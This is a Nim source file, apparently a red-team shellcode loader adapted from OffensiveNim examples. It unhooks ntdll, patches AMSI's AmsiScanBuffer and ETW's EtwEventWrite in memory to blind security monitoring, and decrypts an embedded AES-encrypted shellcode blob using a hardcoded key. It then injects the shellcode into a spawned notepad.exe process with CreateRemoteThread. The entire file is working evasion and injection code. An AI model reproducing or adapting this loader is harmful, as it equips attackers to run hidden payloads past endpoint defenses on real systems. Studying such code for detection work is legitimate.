#[
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/unhook.nim
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/amsi_patch_bin.nim
    Reference: https://github.com/byt3bl33d3r/OffensiveNim/blob/master/src/etw_patch_bin.nim

  TODO:
    - Update to make more modular to avoid needing to re-compile each time (see 2nd reference above)

]#

import winim
import osproc
import nimcrypto
import base64
import strutils
import strformat
import dynlib
import ptr_math


const
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x00000001 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALLOW_STORE = 0x00000003 shl 44
    PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_DYNAMIC_CODE_ALWAYS_ON = 0x00000001 shl 36

when defined amd64:
    #echo "[*] Running in x64 process"
    const amsiPatch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
    const etwPatch: array[1, byte] = [byte 0xc3]
elif defined i386:
    #echo "[*] Running in x86 process"
    const amsiPatch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
    const etwPatch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc toStringByte(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

proc toStringW(chars: openArray[WCHAR]): string =
  result = ""
  for c in chars:
    if cast[char](c) == '\0':
        break
    result.add(cast[char](c))

proc GetProcessByName(process_name: string): DWORD =
    var
        pid: DWORD = 0
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toStringW == process_name:
                pid = entry.th32ProcessID
                break

    return pid


proc ntdllunhook(): bool =
  let low: uint16 = 0
  var 
    processH = GetCurrentProcess()
    mi : MODULEINFO
    ntdllModule = GetModuleHandleA("ntdll.dll")
    ntdllBase : LPVOID
    ntdllFile : FileHandle
    ntdllMapping : HANDLE
    ntdllMappingAddress : LPVOID
    hookedDosHeader : PIMAGE_DOS_HEADER
    hookedNtHeader : PIMAGE_NT_HEADERS
    hookedSectionHeader : PIMAGE_SECTION_HEADER

  GetModuleInformation(processH, ntdllModule, addr mi, cast[DWORD](sizeof(mi)))
  ntdllBase = mi.lpBaseOfDll
  ntdllFile = getOsFileHandle(open("C:\\windows\\system32\\ntdll.dll",fmRead))
  ntdllMapping = CreateFileMapping(ntdllFile, NULL, 16777218, 0, 0, NULL) # 0x02 =  PAGE_READONLY & 0x1000000 = SEC_IMAGE
  if ntdllMapping == 0:
    #echo fmt"Could not create file mapping object ({GetLastError()})."
    return false
  ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0)
  if ntdllMappingAddress.isNil:
    #echo fmt"Could not map view of file ({GetLastError()})."
    return false
  hookedDosHeader = cast[PIMAGE_DOS_HEADER](ntdllBase)
  hookedNtHeader = cast[PIMAGE_NT_HEADERS](cast[DWORD_PTR](ntdllBase) + hookedDosHeader.e_lfanew)
  for Section in low ..< hookedNtHeader.FileHeader.NumberOfSections:
      hookedSectionHeader = cast[PIMAGE_SECTION_HEADER](cast[DWORD_PTR](IMAGE_FIRST_SECTION(hookedNtHeader)) + cast[DWORD_PTR](IMAGE_SIZEOF_SECTION_HEADER * Section))
      if ".text" in toStringByte(hookedSectionHeader.Name):
          var oldProtection : DWORD = 0
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, 0x40, addr oldProtection) == 0:#0x40 = PAGE_EXECUTE_READWRITE
            #echo fmt"Failed calling VirtualProtect ({GetLastError()})."
            return false
          copyMem(ntdllBase + hookedSectionHeader.VirtualAddress, ntdllMappingAddress + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize)
          if VirtualProtect(ntdllBase + hookedSectionHeader.VirtualAddress, hookedSectionHeader.Misc.VirtualSize, oldProtection, addr oldProtection) == 0:
            #echo fmt"Failed resetting memory back to it's orignal protections ({GetLastError()})."
            return false  
  CloseHandle(processH)
  CloseHandle(ntdllFile)
  CloseHandle(ntdllMapping)
  FreeLibrary(ntdllModule)
  return true

proc PatchAmsi(): bool =
    var
        amsi: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    amsi = loadLib("amsi")
    if isNil(amsi):
        #echo "[X] Failed to load amsi.dll"
        return disabled

    cs = amsi.symAddr("AmsiScanBuffer") # equivalent of GetProcAddress()
    if isNil(cs):
        #echo "[X] Failed to get the address of 'AmsiScanBuffer'"
        return disabled

    if VirtualProtect(cs, amsiPatch.len, 0x40, addr op):
        #echo "[*] Applying patch"
        copyMem(cs, unsafeAddr amsiPatch, amsiPatch.len)
        VirtualProtect(cs, amsiPatch.len, op, addr t)
        disabled = true

    return disabled

proc Patchntdll(): bool =
    var
        ntdll: LibHandle
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false

    # loadLib does the same thing that the dynlib pragma does and is the equivalent of LoadLibrary() on windows
    # it also returns nil if something goes wrong meaning we can add some checks in the code to make sure everything's ok (which you can't really do well when using LoadLibrary() directly through winim)
    ntdll = loadLib("ntdll")
    if isNil(ntdll):
        #echo "[X] Failed to load ntdll.dll"
        return disabled

    cs = ntdll.symAddr("EtwEventWrite") # equivalent of GetProcAddress()
    if isNil(cs):
        #echo "[X] Failed to get the address of 'EtwEventWrite'"
        return disabled

    if VirtualProtect(cs, etwPatch.len, 0x40, addr op):
        #echo "[*] Applying patch"
        copyMem(cs, unsafeAddr etwPatch, etwPatch.len)
        VirtualProtect(cs, etwPatch.len, op, addr t)
        disabled = true

    return disabled


proc decryptAES(shellcode: string, aes_key: string, iv: string): string =
  var
    dctx: CTR[aes256]
    key = nimcrypto.fromHex(aes_key)
    iv = nimcrypto.fromHex(iv)
    enctext: seq[byte] = nimcrypto.fromHex(shellcode)
    dectext: seq[byte] = newSeq[byte](len(nimcrypto.fromHex(shellcode)))

  dctx.init(key, iv)
  dctx.decrypt(enctext, dectext)
  dctx.clear()

  #echo "Encrypted text: ", toHex(enctext)
  #echo "Decrypted text: ", toHex(dectext)

  return toHex(dectext)

proc injectCreateRemoteThread[byte](shellcode: openarray[byte]): void =

  let tProcess = startProcess("notepad.exe")
  tProcess.suspend()
  defer: tProcess.close()

  echo "[*] Target Process: ", tProcess.processID

  let pHandle = OpenProcess(PROCESS_ALL_ACCESS, false, cast[DWORD](tProcess.processID))
  defer: CloseHandle(pHandle)

  echo "[*] pHandle: ", pHandle

  let rPtr = VirtualAllocEx(pHandle, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_READWRITE)

  var bytesWritten: SIZE_T
  let wSuccess = WriteProcessMemory(pHandle, rPtr,unsafeAddr shellcode,cast[SIZE_T](shellcode.len),addr bytesWritten)

  echo "[*] WriteProcessMemory: ", bool(wSuccess)
  echo "    \\-- bytes written: ", bytesWritten
  echo ""
  
  #DEBUG
  #var consoleInput = readLine(stdin);

  var oldProtect: DWORD
  let protSuccess = VirtualProtectEx(pHandle, cast[LPVOID](rPtr), shellcode.len, PAGE_EXECUTE_READ, addr oldProtect)

  echo "[*] VirtualProtect: ", bool(protSuccess)
  echo "    \\-- Changed memory protection back to RX instead of RWX"
  echo ""

  let tHandle = CreateRemoteThread(pHandle, NULL, 0, cast[LPTHREAD_START_ROUTINE](rPtr), NULL, 0, NULL)
  defer: CloseHandle(tHandle)

  echo "[*] tHandle: ", tHandle
  echo "[+] Injected"

when defined(windows):

  # This is essentially the equivalent of 'if __name__ == '__main__' in python
  when isMainModule:
    # Replace these values with IV, AES key, and encrypted shellcode printed by encrypt_aes.nim
    let iv = "EE9B4C89192F8D87DB36A4A27C1AA576"
    let key = "BACF17571CF7ADB7796B3BD186063E44C8935CCBB15366F2C2156EA7CADDC4DB"
    var shellcode_enc = "A052BFF4AFFA14AA8F9B8BB33EBE3A6C4EC2835127AB493449E3D41D8B61A7993DB4D1DEC5C035F644B0E2CF9CF4DBD46BDA104B3856F9CE78FDB00A8FFA798C51CE81D36E3C7028D8F5870E6755B002A33DFD4A8CF428BB15C702B530426B7D9E8660A90F9254D9E3578469E278D774909E38567E0D31996925EFC88DDAB1477707FF6314A1AF138578E4D3AD7154339CDD324D8275998481F1F4949D9E6D656CD33B8A42C1CBE0942C6787F697EBA34CC8C22263519365A0D2424EE2C5FB9165B15F7A31EFFD88484AB3DA7C9486E6CD5E59F12DB4269C1D721B2C9E83C427BB071CE8CD26A7228FBC4F703956D37904BBC60C32BA5CAF9DAC8647525D0BD050747C9D626875AD375E46A57D5F9CAD0EFC161CD9948392AD6C7A042C73AB239FA0E3A8E8FB9CF15CE823531511D1511ADC349A36CAA265BA536947D360119EB91006891303F0DCDA0B22CFD320358FD276D323A39D51FDEAA7AA46FAF49B1DBAA6491961DA583F317A487263EB4C233593A7AE7B1E4EDF8A0202DDB4D35B789B5612BCD84961E2"
    var shellcode: seq[byte] = newSeq[byte](len(nimcrypto.fromHex(shellcode_enc)))

    var shellcode_b64 = toStringByte(nimcrypto.fromHex(decryptAES(shellcode_enc, key, iv)))
    #echo "B64 shellcode: ", shellcode_b64
    shellcode = toByteSeq(decode(shellcode_b64))

    var success = ntdllunhook()
    echo fmt"[*] unhook Ntdll: {bool(success)}"
    success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"
    success = Patchntdll()
    echo fmt"[*] ETW blocked by patch: {bool(success)}"
    injectCreateRemoteThread(shellcode)
    echo "All done"